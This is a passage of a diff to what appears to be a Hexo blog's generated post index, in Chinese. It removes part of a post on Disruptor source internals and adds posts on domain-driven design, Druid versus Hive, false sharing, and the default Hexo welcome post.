<span class="title">RhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> INITIAL_VALUE = -<span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe UNSAFE;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> VALUE_OFFSET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过前置p1<del>p7，后置p9</del>p15填充缓存行，防止缓冲行共享。一般的处理器架构缓存行是64字节，但是有个处理器架构是128字节，所以采用前后填充，能够实现在所有处理器上消除伪共享。</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor2.png" alt="缓存行"></p>
-<h3 id="2-3-环形-buffer"><a href="#2-3-环形-buffer" class="headerlink" title="2.3 环形 buffer"></a>2.3 环形 buffer</h3><p>内部采用数组存储数据，充分利用内存局部性原理。</p>
-<p>只使用一个指针来表示可用数据，没有头尾指针。消除头尾指针竞争。各个生产者消费者只需要申请自己的序列号，就可以进行操作了。不存在竞争同一资源。</p>
-<p>bufferSize 是 2 的 n 次幂，通过 sequence &amp; (2^n -1) 来计算索引。</p>
-<p>通过数据覆盖，不需要删除数据，无需 GC。</p>
-<h2 id="三、Disruptor-如何工作"><a href="#三、Disruptor-如何工作" class="headerlink" title="三、Disruptor 如何工作"></a>三、Disruptor 如何工作</h2><h3 id="3-1-消费者端"><a href="#3-1-消费者端" class="headerlink" title="3.1 消费者端"></a>3.1 消费者端</h3><p>每个消费者都对应一个 ConsumerBarrier，消费者通过 ConsumerBarrier 与 Disruptor 交互。消费者通过 ConsumerBarrier 获取下一个可以消费的序列号，然后开始消费。比如消费者 A 当前消费的序列号是8，通过 ConsumerBarrier 获取下一个可消费的序列号是 12，那么消费者 A 可以批量消费序列号 9，10，11，12 的数据。</p>
-<p><strong>消费者消费数据步骤：1.获取序列号，2.消费数据</strong></p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor3.png" alt="消费者消费步骤"></p>
-<h3 id="3-2-生产者端"><a href="#3-2-生产者端" class="headerlink" title="3.2 生产者端"></a>3.2 生产者端</h3><p>多个生产者对应一个 Sequencer，也就是说多个生产者共用一个序列号。</p>
-<p><strong>生产者生产数据步骤：1.申请序列号，2.填充数据，3.发布</strong></p>
-<p>生产者 A 和生产者 B <strong>同时生产</strong>数据，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor4.png" alt="生产者1"></p>
-<p>生产者 A <strong>讯轮阻塞</strong> 等待消费者 A，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor5.png" alt="生产者2"></p>
-<p>消费者 A <strong>轮训非阻塞</strong> 等待生产者 B，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor6.png" alt="生产者3"></p>
-<h2 id="四、源码导读"><a href="#四、源码导读" class="headerlink" title="四、源码导读"></a>四、源码导读</h2><h3 id="4-1-核心类"><a href="#4-1-核心类" class="headerlink" title="4.1 核心类"></a>4.1 核心类</h3><p><a href="https://github.com/LMAX-Exchange/disruptor/wiki/Introduction">https://github.com/LMAX-Exchange/disruptor/wiki/Introduction</a></p>
-<p>ringbuff上有指针，每个消费者都维护自己的一个指针，生产者共用一个指针。指针是由 Sequencer类来控制的假设buffsize=8，如果消费者在消费id7，生产者将生产id15（15-buffsize=7），是同一个位置，生产者阻塞，如果生产者在生产id7，消费者在消费id7，消费者阻塞</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/162762019.png" alt="流程图"></p>
-<h3 id="4-2-生产者端"><a href="#4-2-生产者端" class="headerlink" title="4.2 生产者端"></a>4.2 生产者端</h3><h4 id="4-2-1-申请序号"><a href="#4-2-1-申请序号" class="headerlink" title="4.2.1 申请序号"></a>4.2.1 申请序号</h4><p>调用 Sequencer#get ，直接看多生产者如果申请序号的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;n must be &gt; 0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> current;</span><br><span class="line">  <span class="keyword">long</span> next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取当前发布序号</span></span><br><span class="line">    current = cursor.get();</span><br><span class="line">    next = current + n;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">long</span> wrapPoint = next - bufferSize;</span><br><span class="line">    <span class="comment">// gatingSequenceCache 这是 gatingSequence 的缓存，存入的是最小的消费者消费序列（有多个消费者）</span></span><br><span class="line">    <span class="keyword">long</span> cachedGatingSequence = gatingSequenceCache.get();</span><br><span class="line">		<span class="comment">// 生产者要覆盖未被消费的数据（生产者超过消费者一圈了）</span></span><br><span class="line">    <span class="keyword">if</span> (wrapPoint &gt; cachedGatingSequence || cachedGatingSequence &gt; current)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获取最小的消费者序列</span></span><br><span class="line">      <span class="keyword">long</span> gatingSequence = Util.getMinimumSequence(gatingSequences, current);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wrapPoint &gt; gatingSequence)</span><br><span class="line">      &#123;</span><br><span class="line">        LockSupport.parkNanos(<span class="number">1</span>); <span class="comment">// TODO, should we spin based on the wait strategy?</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">			<span class="comment">// 更新缓存</span></span><br><span class="line">      gatingSequenceCache.set(gatingSequence);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cursor.compareAndSet(current, next))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-2-2-写入数据"><a href="#4-2-2-写入数据" class="headerlink" title="4.2.2 写入数据"></a>4.2.2 写入数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> (E)entries[(<span class="keyword">int</span>)sequence &amp; indexMask];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// dosomething</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="4-2-3发布"><a href="#4-2-3发布" class="headerlink" title="4.2.3发布"></a>4.2.3发布</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publish</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 将待发布的序列设为可用，这样消费者就可以消费这个序列了</span></span><br><span class="line">  setAvailable(sequence);</span><br><span class="line">  waitStrategy.signalAllWhenBlocking();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-消费者端"><a href="#4-3-消费者端" class="headerlink" title="4.3 消费者端"></a>4.3 消费者端</h3><p>Disruptor#start 启动，会在线程池里启动 EventProcessor，每个 EventHandler 对应一个 EventProcessor</p>
-<p>BatchEventProcessor 是 EventProcessor 的实现类，run方法里会轮训，是否有 event 可以被消费，如果可以就调用 EventHandler#onEvent 方法，触发消费者事件。</p>
-<p>重点看 BatchEventProcessor#run 方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 状态设为启动，是一个AtomicBoolean</span></span><br><span class="line">  <span class="keyword">if</span> (!running.compareAndSet(<span class="keyword">false</span>, <span class="keyword">true</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Thread is already running&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 清除中断</span></span><br><span class="line">  sequenceBarrier.clearAlert();</span><br><span class="line">	<span class="comment">// 判断一下消费者是否实现了LifecycleAware ,如果实现了这个接口，那么此时会发送一个启动通知</span></span><br><span class="line">  notifyStart();</span><br><span class="line"></span><br><span class="line">  T event = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">long</span> nextSequence = sequence.get() + <span class="number">1L</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 获取最大可用的序号，表示在之前的都可以安全消费</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> availableSequence = sequenceBarrier.waitFor(nextSequence);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (nextSequence &lt;= availableSequence)</span><br><span class="line">        &#123;</span><br><span class="line">          event = dataProvider.get(nextSequence);</span><br><span class="line">          eventHandler.onEvent(event, nextSequence, nextSequence == availableSequence);</span><br><span class="line">          nextSequence++;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 记录对应消费者消费到哪里</span></span><br><span class="line">        sequence.set(availableSequence);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> TimeoutException e)</span><br><span class="line">      &#123;</span><br><span class="line">        notifyTimeout(sequence.get());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> AlertException ex)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果任务停止，就退出</span></span><br><span class="line">        <span class="keyword">if</span> (!running.get())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable ex)</span><br><span class="line">      &#123;</span><br><span class="line">        exceptionHandler.handleEventException(ex, nextSequence, event);</span><br><span class="line">        sequence.set(nextSequence);</span><br><span class="line">        nextSequence++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">finally</span></span><br><span class="line">  &#123;</span><br><span class="line">    notifyShutdown();</span><br><span class="line">    <span class="comment">// 任务关闭</span></span><br><span class="line">    running.set(<span class="keyword">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>消费者在消费时候，需要判断其最大可消费的序列号，这个最大可消费序列号是通过 SequenceBarrier#waitFor 方法来实现的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">waitFor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> AlertException, InterruptedException, TimeoutException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    		<span class="comment">// 判断是否中断，如果中断就抛出异常，这样上层捕捉，就可以停止 BatchEventProcessor</span></span><br><span class="line">        checkAlert();</span><br><span class="line">				<span class="comment">// 根据不同的策略获取可用的序列</span></span><br><span class="line">        <span class="keyword">long</span> availableSequence = waitStrategy.waitFor(sequence, cursorSequence, dependentSequence, <span class="keyword">this</span>);</span><br><span class="line">				<span class="comment">// 可用序列比申请的序列小，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (availableSequence &lt; sequence)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> availableSequence;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 如果是单生产者，直接返回 availableSequence；对于多生产者判断是否可用，不可用返回sequence-1</span></span><br><span class="line">        <span class="keyword">return</span> sequencer.getHighestPublishedSequence(sequence, availableSequence);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://github.com/LMAX-Exchange/disruptor">https://github.com/LMAX-Exchange/disruptor</a></p>
+    <title>ddd-overview</title>
+    <url>/ddd-overview.html</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>领域驱动设计（Domain-Driven Design，简称DDD）起源于2004年Eric Evans出版《领域驱动设计》，用于应对复杂需求的软件开发。随着近几年微服务架构的普及，DDD 又火起来了</p>
+<p>传统开发中，先根据业务需求设计好数据库 ER 图，然后实现代码。这种方式业务逻辑与技术细节精密耦合不利于后续的需求扩展。DDD 中先进行业务领域建模，再实现代码，让业务逻辑不依赖于技术细节（技术细节越往后决定越好）。</p>
+<p>本篇文章是《领域驱动设计模式、原理与时间》读书笔记总结，重点参数领域驱动设计思想，有疑问地方欢迎讨论。文中的业务场景以会议预定系统为例，详见 <a href="https://www.meetup.com/">Meetup.com</a></p>
+<h2 id="DDD-领域概念"><a href="#DDD-领域概念" class="headerlink" title="DDD 领域概念"></a>DDD 领域概念</h2><table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>定义</strong></th>
+<th><strong>举例</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>实体</td>
+<td>有身份标识，一般对应业务对象，封装属性（不公开），公开领域行为</td>
+<td>会议是个实体，表示一个唯一被创建的会议，包含会议成员、地点、会议主题等属性，提供创建会议、添加成员、添加评论等领域行为</td>
+</tr>
+<tr>
+<td>值对象</td>
+<td>富含行为，无身份，不可变，参数校验</td>
+<td>会议室地址是个值对象，会校验地址合法性，能清晰的表示业务属性。 手机号值对象封装 long 基元属性，有校验参数，业务语义</td>
+</tr>
+<tr>
+<td>聚合</td>
+<td>一组业务紧密管理的实体和值对象，是数据修改和持久化的基本单元 聚合内保持强一致性，聚合间保持最终一致性</td>
+<td>会议是个聚合，MeetingGroup 实体是该聚合的根实体，组成员、组地点等是附属聚合的值对象。对领域外公开创建会议，添加成员的操作</td>
+</tr>
+<tr>
+<td>存储库</td>
+<td>封装资源（不局限于数据库、文件、网络存储），只公开需要的操作。领域模型映射到持久化存储</td>
+<td>会议聚合的存储、更新、查询都由存储库代理完成</td>
+</tr>
+<tr>
+<td>领域事件</td>
+<td>解耦不同领域的依赖，B 领域需要响应处理 A 领域的操作。同一个微服务中可以是同步事件</td>
+<td>MeetingGroup 申请，申请通过后，会发送事件给会议域，会议域创建 MeetingGroup。解耦会议域与管理员域</td>
+</tr>
+<tr>
+<td>领域服务</td>
+<td>领域服务没有任何属性或数据，只是一个领域行为或动作，不适合放在任何聚合内的逻辑行为</td>
+<td>比如领域内通用的校验逻辑</td>
+</tr>
+<tr>
+<td>应用服务</td>
+<td>应用服务对应到一个具体业务场景，通过编排聚合、资源库、领域事件、外部适配接口、领域服务来完成</td>
+<td>Meeting 创建场景，调用存储库获取 MeetingGroup，调用 MeetingGroup 创建会议，通知会议创建事件（推荐放在领域中）</td>
+</tr>
+</tbody></table>
+<h2 id="战略模式——在限界上下文通信"><a href="#战略模式——在限界上下文通信" class="headerlink" title="战略模式——在限界上下文通信"></a>战略模式——在限界上下文通信</h2><p>战略模式看似很虚，but 是最重要的。与领域专家、PM一起讨论提炼问题域，编写 UL。划分领域和限界上下文（Bouded Context），并确定上下文之间的关系。</p>
+<h3 id="什么是领域、子域和限界上下文？"><a href="#什么是领域、子域和限界上下文？" class="headerlink" title="什么是领域、子域和限界上下文？"></a>什么是领域、子域和限界上下文？</h3><p>领域代表现实世界的特定问题和解决方案的集合。限界上下文（Bouded Context）定义了模型的适用范围，是一个语言边界，可以是一个微服务。自主拥有展现-领域逻辑-数据库的完整代码堆栈。</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754130.png" alt="a8be9348bc53f7d5bb0483328cea4b8d.png"></p>
+<p>子域是问题空间的概念，限界上下文是解空间的概念。所以限界上下文一定可以对应上一个子域（子域可以对应多个上下文）。一个限界上下文就是一个语言边界，可以是一个微服务。自主拥有展现-领域逻辑-数据库的完整代码堆栈。</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754160.png" alt="352208ffb7378dd38e895e782449e9a8.png"></p>
+<h3 id="如何划分限界上下文？"><a href="#如何划分限界上下文？" class="headerlink" title="如何划分限界上下文？"></a>如何划分限界上下文？</h3><p>根据业务概念来划分，实际需要参考团队粒度、技术特点做裁剪</p>
+<p>领域概念只在限界上下文内有意义。比如同样是订单，在不同的上下文表示不同的概念</p>
+<h2 id="战术模式——创建有效的领域模型"><a href="#战术模式——创建有效的领域模型" class="headerlink" title="战术模式——创建有效的领域模型"></a>战术模式——创建有效的领域模型</h2><p>梳理清楚上下文之间的关系后，从战术层面上剖析上下文内部的组织关系</p>
+<p>依次确认值对象、实体、领域服务和聚合根。之后确认基础架构和应用层。</p>
+<p>下图是 Meeting Groups 聚合根的代码细节，Meeting Groups 属于 Meetings 限界上下文。</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251755738.png" alt="1591c32ac3414813e9050fe78111980f.png"></p>
+<p>下图是整体服务架构：</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754207.png" alt="92a72233fa22d43e5bab22a3993efd06.png"></p>
+<h3 id="如何区分值对象与实体"><a href="#如何区分值对象与实体" class="headerlink" title="如何区分值对象与实体"></a>如何区分值对象与实体</h3><p>值对象只是问题域的属性和特征。实体具有唯一身份标识，具有行为和生命周期。值对象和传统的 java bean 类似，区别是：不可变，有参数校验。</p>
+<p>以图书馆系统为例，图书具有唯一标识是一个实体，有出租、归还等行为。图书的 ISBN 号是图书的 ID 属性是一个值对象。为什么不把 ISBN 定义为 string 简单字段？以为 ISBN 有一些隐藏属性，包括 ISBN 的类型和合法性校验。</p>
+<h3 id="为什么需要聚合"><a href="#为什么需要聚合" class="headerlink" title="为什么需要聚合"></a>为什么需要聚合</h3><p>一些对象具有不可变条件，以采购系统为例，当采购请求被通过后，不能修改采购项。采购项与采购请求两个实体具有不变条件，放在一个聚合中。</p>
+<p>为保证聚合内的强一致性，外界只能引用聚合根，不能引用聚合内部对象。如有必要，聚合返回内部对象的副本给外界。</p>
+<h3 id="领域模型到底是什么"><a href="#领域模型到底是什么" class="headerlink" title="领域模型到底是什么"></a>领域模型到底是什么</h3><p>描述业务逻辑领域概念，偏向代码实现的领域对象。我将其理解为领域层的整个代码实现</p>
+<p>DDD 将业务分为 4 层：UI、应用、领域、基础。其核心是高度提纯、通用、少变化的领域层。领域层对外暴露业务行为接口，驱动应用层和基础层的设计，是谓“领域驱动设计”。</p>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>没找找到合适的 ddd demo 项目，可以参考下面的图书馆系统的代码。这是一个分层架构，包括表示层、应用层、领域层和基础架构层</p>
+<p>repository 存储库接口定义在 model 中，实现在 infra 中。application 对外的接口接收请求。lending 表示借阅上下文</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251754252.png" alt="6ba4df47f06a010a9f327bbc4e9aa836.png"></p>
+<p>lending 表示借阅上下文。book 表示一个领域</p>
+<p>为实现依赖倒置，存储库的接口定义在 model 中，实现在 infra 中</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《领域驱动设计模式、原理与实践》</p>
+<p><a href="https://github.com/kgrzybek/modular-monolith-with-ddd">https://github.com/kgrzybek/modular-monolith-with-ddd</a></p>
+<p><a href="https://mp.weixin.qq.com/s/A1j9STSCfQANtl1dY2UlXA">https://mp.weixin.qq.com/s/A1j9STSCfQANtl1dY2UlXA</a></p>
 ]]></content>
       <categories>
-        <category>java</category>
+        <category>读书笔记</category>
       </categories>
       <tags>
-        <tag>源码</tag>
-        <tag>disruptor</tag>
+        <tag>ddd</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>druid-vs-hive</title>
+    <url>/druid-vs-hive.html</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>druid 用于实时查询，粗粒度的查询。hive 用于离线查询，细粒度的查询，比如查询某个用户的数据</p>
+<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><p>Druid 是 MetaMarket 公司研发，专为海量数据集上的做高性能 OLAP (OnLine Analysis Processing)而设计的数据存储和分析系统。主要解决的是对于大量的基于时序的数据进行聚合查询。数据可以实时摄入，进入到 druid 后立即可查。</p>
+<p>Keyword: 分布式、列式存储、实时分析、PB级、聚合查询</p>
+<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251731981" alt="img"></p>
+<ul>
+<li>realtime 组件负责数据的实时摄入。</li>
+<li>broker 组件负责查询任务的分发以及查询结果的汇总，并将结果返回给用户</li>
+<li>historical 组件负责索引后的历史数据的存储，数据存储在 deep storage。deep storage 可以是本地，也可以是 HDFS 等分布式文件系统</li>
+</ul>
+<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据的插入频率非常高，但是更新频率非常低。大部分的查询为聚合查询（aggregation）和报表查询（reporting queries），例如监控系统</p>
+<h2 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h2><p>Hive 由 FaceBook 开发，用于解决海量结构化日志的数据统计。依赖 HDFS 存储数据，依赖 MapReduce 处理数据。Hive 的执行延迟比较高，因此常用于数据分析，对实时性要求不高的场合。架构图如下</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251719767.png" alt="架构"></p>
+<h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据汇总：每天/每周用户点击数，流量统计</p>
+<p>非实时分析：日志分析；文本分析</p>
+<p>数据仓库：数据抽取，加载，转换（ETL）</p>
+<p>数据挖掘：用户行为分析；兴趣分区；区域展示</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices">https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices</a></p>
+<p><a href="https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</a></p>
+<p><a href="https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5">https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5</a></p>
+]]></content>
+      <categories>
+        <category>大数据</category>
+      </categories>
+      <tags>
+        <tag>druid</tag>
+        <tag>hive</tag>
+        <tag>大数据</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>伪共享</title>
+    <url>/false-sharing.html</url>
+    <content><![CDATA[<h3 id="伪共享"><a href="#伪共享" class="headerlink" title="伪共享"></a>伪共享</h3><p>在 cpu 和 内存之间有高速缓存区（cache）,cache 一般集成在 cpu 内部，也叫做 cpu Cache。如下图是一个二级缓存示意图。<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file.png" alt="二级缓存示意图"></p>
+<span id="more"></span>
+
+<p>cache 内部是按照行来存储的，每行称为一个 cache 行，大小为2的n次幂，一个 cache 行 可能会存有多个变量数据<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file2.png" alt="cache行"></p>
+<p>当多个线程同时修改一个 cache 行里面的多个变量时候，由于同时只能有一个线程操作缓存行，所以相比每个变量放到一个缓存行性能会有所下降，这就是伪共享。</p>
+<p>当单个线程顺序访问同一个 cache 行的多个变量，利用<strong>程序运行局部性原理</strong>会加快程序运行。当多个程序同时访问同一个 cache 行的多个变量，会发生竞争，速度会慢</p>
+]]></content>
+      <categories>
+        <category>java进阶</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>并发编程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/hello-world.html</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
   <entry>
     <title>hexo5-next8 配置</title>
@@ -504,38 +554,6 @@
       </tags>
   </entry>
   <entry>
-    <title>druid-vs-hive</title>
-    <url>/druid-vs-hive.html</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>druid 用于实时查询，粗粒度的查询。hive 用于离线查询，细粒度的查询，比如查询某个用户的数据</p>
-<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><p>Druid 是 MetaMarket 公司研发，专为海量数据集上的做高性能 OLAP (OnLine Analysis Processing)而设计的数据存储和分析系统。主要解决的是对于大量的基于时序的数据进行聚合查询。数据可以实时摄入，进入到 druid 后立即可查。</p>
-<p>Keyword: 分布式、列式存储、实时分析、PB级、聚合查询</p>
-<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251731981" alt="img"></p>
-<ul>
-<li>realtime 组件负责数据的实时摄入。</li>
-<li>broker 组件负责查询任务的分发以及查询结果的汇总，并将结果返回给用户</li>
-<li>historical 组件负责索引后的历史数据的存储，数据存储在 deep storage。deep storage 可以是本地，也可以是 HDFS 等分布式文件系统</li>
-</ul>
-<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据的插入频率非常高，但是更新频率非常低。大部分的查询为聚合查询（aggregation）和报表查询（reporting queries），例如监控系统</p>
-<h2 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h2><p>Hive 由 FaceBook 开发，用于解决海量结构化日志的数据统计。依赖 HDFS 存储数据，依赖 MapReduce 处理数据。Hive 的执行延迟比较高，因此常用于数据分析，对实时性要求不高的场合。架构图如下</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251719767.png" alt="架构"></p>
-<h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据汇总：每天/每周用户点击数，流量统计</p>
-<p>非实时分析：日志分析；文本分析</p>
-<p>数据仓库：数据抽取，加载，转换（ETL）</p>
-<p>数据挖掘：用户行为分析；兴趣分区；区域展示</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices">https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices</a></p>
